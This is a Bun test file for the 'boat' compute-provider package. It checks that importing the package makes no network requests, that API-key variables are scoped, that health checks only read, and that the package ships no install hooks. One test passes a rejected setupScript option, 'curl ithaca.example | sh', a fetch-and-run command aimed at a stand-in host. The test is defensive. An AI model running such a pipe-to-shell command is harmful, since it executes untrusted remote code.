/**
 * Selecting `boat` resolves this package through core's built-in registry,
 * and neither installing, importing nor resolving it makes a request.
 */

import { describe, expect, test } from "bun:test";
import { readdirSync, readFileSync } from "node:fs";
import { join, resolve } from "node:path";

import { resolveComputeInstance } from "@schlessera/brain/internal";

import { computeProvider, defaultKeyEnv } from "../src/index";
import { fakeBoat } from "./helpers/fake-boat";
import { contextFor, KEY } from "./helpers/context";

const PKG = resolve(import.meta.dir, "..");
const entry = { provider: "boat" as const, options: { machine: "small" }, lease: { maxSeconds: 600 }, maxConcurrent: 1 };

describe("installing and selecting Boat", () => {
  test("importing the package and resolving the boat built-in send no request", () => {
    // A fresh process, so the count starts before the package's first import.
    const script = `
      let calls = 0;
      globalThis.fetch = (() => { calls += 1; throw new Error("no request expected"); });
      const pkg = await import("@schlessera/brain-compute-boat");
      const { resolveComputeInstance } = await import("@schlessera/brain/internal");
      const r = await resolveComputeInstance("boat-small", ${JSON.stringify(entry)}, { env: { BRAIN_COMPUTE_BOAT_API_KEY: "boat_odysseus_child" } });
      console.log(JSON.stringify({ calls, ok: r.ok, same: r.ok && r.instance.provider === pkg.computeProvider, keyEnv: r.ok ? r.instance.keyEnv : r.reason }));
    `;
    const child = Bun.spawnSync([process.execPath, "-e", script], { cwd: PKG, stdout: "pipe", stderr: "pipe" });
    expect(child.exitCode, child.stderr.toString()).toBe(0);
    expect(JSON.parse(child.stdout.toString().trim().split("\n").pop()!)).toEqual({ calls: 0, ok: true, same: true, keyEnv: "BRAIN_COMPUTE_BOAT_API_KEY" });
  });

  test("the instance reads BRAIN_COMPUTE_BOAT_API_KEY, never Boat's own CLI variable", async () => {
    expect(defaultKeyEnv).toBe("BRAIN_COMPUTE_BOAT_API_KEY");
    const viaCli = await resolveComputeInstance("boat-small", entry, { env: { BOAT_API_KEY: "boat_owner_cli_key" } });
    expect(viaCli.ok ? "resolved" : [viaCli.code, viaCli.reason.includes("BRAIN_COMPUTE_BOAT_API_KEY")]).toEqual(["provider_unavailable", true]);
    const named = await resolveComputeInstance("boat-small", { ...entry, apiKeyEnv: "BOAT_CI_KEY" }, { env: { BOAT_CI_KEY: "boat_scoped_ci" } });
    expect(named.ok && [named.instance.keyEnv, named.instance.secret]).toEqual(["BOAT_CI_KEY", "boat_scoped_ci"]);
  });

  test("options outside the schema leave the instance unavailable", async () => {
    for (const options of [{ setupScript: "curl ithaca.example | sh" }, { env: { A: "1" } }, { baseUrl: "https://ithaca.example" }, { machine: "huge" }]) {
      const r = await resolveComputeInstance("boat-small", { ...entry, options }, { env: { BRAIN_COMPUTE_BOAT_API_KEY: "k" } });
      expect(r.ok ? "resolved" : r.code).toBe("provider_unavailable");
    }
  });

  test("health reads and never creates", async () => {
    for (const limitsForbidden of [false, true]) {
      const fake = fakeBoat({ apiKey: KEY, limitsForbidden });
      const health = await computeProvider.health(contextFor(fake));
      expect(health.kind).toBe("ok");
      expect(fake.requests.map((r) => r.method)).toEqual(limitsForbidden ? ["GET", "GET"] : ["GET"]);
      expect(fake.created()).toBe(0);
    }
    const fake = fakeBoat({ apiKey: KEY });
    expect((await computeProvider.health(contextFor(fake, { secret: "boat_wrong_key_000" }))).kind).toBe("unavailable");
    expect((await computeProvider.health({ ...contextFor(fake), secret: undefined })).kind).toBe("unavailable");
    expect(fake.requests.filter((r) => r.method !== "GET")).toEqual([]);
  });

  test("the package imports @schlessera/brain for types only, and ships no install hook or vendor SDK", () => {
    const transpiler = new Bun.Transpiler({ loader: "ts" });
    const runtime: string[] = [];
    for (const file of readdirSync(join(PKG, "src"))) {
      for (const imp of transpiler.scanImports(readFileSync(join(PKG, "src", file), "utf8"))) runtime.push(imp.path);
    }
    expect([...new Set(runtime.filter((path) => !path.startsWith(".") && !path.startsWith("node:")))]).toEqual(["zod"]);
    const manifest = JSON.parse(readFileSync(join(PKG, "package.json"), "utf8"));
    expect(Object.keys(manifest.dependencies)).toEqual(["zod"]);
    expect(manifest.peerDependenciesMeta["@schlessera/brain"]).toEqual({ optional: true });
    expect(Object.keys(manifest.scripts).filter((s) => /install/.test(s))).toEqual([]);
  });
});
